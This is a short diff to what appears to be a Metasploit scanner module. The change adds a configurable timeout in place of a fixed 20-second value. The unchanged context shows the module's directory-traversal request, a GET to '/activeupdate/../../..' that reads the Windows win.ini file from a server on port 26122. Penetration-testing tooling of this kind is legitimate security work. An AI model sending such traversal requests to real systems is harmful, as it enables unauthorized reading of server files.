@@ -33,7 +33,12 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(26122),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 20 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 20
   end
 
   def run_host(target_host)
@@ -42,7 +47,7 @@ class Metasploit3 < Msf::Auxiliary
       {
         'uri'     => '/activeupdate/../../../../../../../../../../../windows\\win.ini',
         'method'  => 'GET',
-      }, 20)
+      }, timeout)
 
     if not res
       print_error("No response from server")
